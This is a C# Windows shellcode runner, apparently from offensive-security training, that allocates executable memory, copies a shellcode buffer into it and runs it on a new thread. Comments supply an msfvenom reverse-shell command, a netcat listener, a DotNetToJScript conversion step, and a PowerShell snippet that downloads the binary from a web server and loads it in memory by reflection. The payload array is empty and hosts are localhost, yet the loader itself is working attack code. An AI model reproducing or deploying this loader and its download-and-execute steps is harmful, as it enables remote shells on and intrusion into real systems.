using System;
using System.Runtime.InteropServices;


/*
 * Convert to Jscript
 * DotNetToJScript.exe ShellcodeRunner.dll -c ShellcodeRunner.Class1 --lang=Jscript --ver=v4 -o met443.js
 */

namespace ShellcodeExec
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void loadShellcode()
        {
            // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f csharp
            byte[] buf = new byte[460] {};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public static void Main(string [] args)
        {
            /*
             * Start nc to catch shell, e.g.
             * 
             *   nc64.exe -nlvp 4444
             * 
             * This can also be hosted on a remote web server and be loaded via PowerShell reflection. 
             * 
             *  $data = (New-Object System.Net.WebClient).DownloadData('http://127.0.0.1:8000/ShellcodeExec.exe')
             *  $assem = [System.Reflection.Assembly]::Load($data)
             *  $class = $assem.GetType("ShellcodeExec.Program")
             *  $method = $class.GetMethod("Main")
             *  $method.Invoke(0, @($null))
             * 
             * 
             */
            loadShellcode();
        }
    }
}
